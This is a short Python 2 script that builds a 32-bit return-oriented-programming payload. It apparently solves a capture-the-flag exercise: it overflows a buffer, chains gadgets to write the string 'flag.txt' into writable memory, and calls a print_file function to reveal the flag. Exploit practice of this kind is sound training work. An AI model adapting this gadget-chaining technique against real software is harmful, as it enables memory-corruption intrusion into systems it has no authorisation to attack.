from binascii import hexlify
import struct

def p32(addr):
    return struct.pack("<I", addr)

def pack_string(string):
    return int("0x" + "".join(map(lambda p: "".join(p), zip(hexlify(string)[::-1][1::2], hexlify(string)[::-1][0::2]))), 16)

offset = 44

# mov DWORD PTR [edi],ebp; ret;
write_gadget = 0x08048543

# > vmmap (DON'T WRITE AT START)
write_loc = 0x0804a000 + 0x50

# pop edi; pop ebp; ret;
pop_gadget = 0x080485aa
print_file = 0x80483d0

payload = "\x90" * offset +\
    p32(pop_gadget) + p32(write_loc) + p32(pack_string("flag")) + p32(write_gadget) +\
    p32(pop_gadget) + p32(write_loc + 0x4) + p32(pack_string(".txt")) + p32(write_gadget) +\
    p32(print_file) + 'soap' + p32(write_loc)

print payload
